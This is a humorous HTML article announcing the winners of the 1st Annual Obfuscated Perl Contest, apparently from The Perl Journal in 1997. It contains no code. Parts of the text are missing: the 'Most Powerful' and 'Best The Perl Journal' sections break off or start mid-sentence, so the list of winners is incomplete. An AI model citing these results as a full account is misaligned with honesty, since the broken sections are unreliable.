  <h2 align="center">The 1st Annual Obfuscated Perl Contest
  Victors</h2>

  <h4><i>Felix Gallo</i></h4>
  <!-- packages described, if necessary -->
  Like full-on biological war, Obfuscated Perl contests do not lend
  themselves to the concept of 'winning.' The survivors can only
  hope to redeem themselves with penance and a life of anguished
  regret.

  <p>This year, the judging committee buckled under the onslaught
  of over 30 accursed felons, deviants and ne'er-do-wells. Two
  disturbing trends soon emerged: first, the quantity of
  malevolence has risen sharply; and second, the skill with which
  it is wielded has grown exponentially. Judges were carried away
  howling to an unknown moon. One developed an incurable allergy to
  anonymous list references. Several attempted variable
  suicide.</p>

  <p>But we persevered. Here are the top winners in each of the
  four categories. All of the first, second, and third-place
  entries can be found on the TPJ web site, including descriptions
  of what the programs do, how they work, and any other color
  commentary provided by the authors.</p>

  <h3>Most Powerful</h3>

  <p>This award is granted to the code which does the most with the
  least. The limit on bytecount is 512 characters, not including
  whitespace.</p>

  server, Bill Wendling's sound-alike word lister, and Stephen
  McCamant's phone number word locator.</p>

  <h3>Best "The Perl Journal"</h3>

  <p>In the fine 'just another Perl hacker' tradition, this award

  <h3>Best Year 2000 Error</h3>

  <p><i>"Marsh &amp; McLennan Inc. is offering businesses a hedge
  against Year 2000 problems. The New York insurance broker will
  sell up to $200 million worth of insurance against business
  losses caused by the policyholder's own computer system, or by
  another company's neglect to become Year 2000-compliant, or by
  data supplied by another company's computers. Before the policy
  is issued, however, Marsh &amp; McLennan will enlist experts to
  make sure that the policy-buyer is taking all possible steps to
  avoid Year 2000 problems." (Information Week 3 Feb 97, via
  EDUPAGE)</i></p>

  <p>It's hard to escape the conclusion that crafting obfuscated
  code can be not just enjoyable but profitable as well. For $200
  million, can you hide a Year 2000 bug well enough to fool some
  insurance salesmen?</p>

  <p>First Place: <b>Stephen McCamant</b>, whose entry was not only
  grotesque enough, but also alone in the category enough to win
  outright. Perhaps what they say about a lack of year 2000
  expertise is true!</p>

  <h3>Best of Show</h3>

  <p>The 1997 Best of Show award goes to Stephen McCamant, whose
  entry in the Most Creative category takes special pains to cause
  special pain. We can only hope the grim knowledge of what he has
  done haunts him to the end of his days. Only the fact that his
  virtual machine was based on the Apple ][ squeaked him by Joe
  Futrelle's TPJ-printing entry at the wire for the victory.</p>

  <p>Thanks to all who entered this year's contest! Everyone was
  skilled enough that judging was very difficult. As before, we
  strongly recommend that aspiring Perl programmers read the
  entries and try to decipher them; you can learn quite a bit in
  the process, if you stay sane.</p>
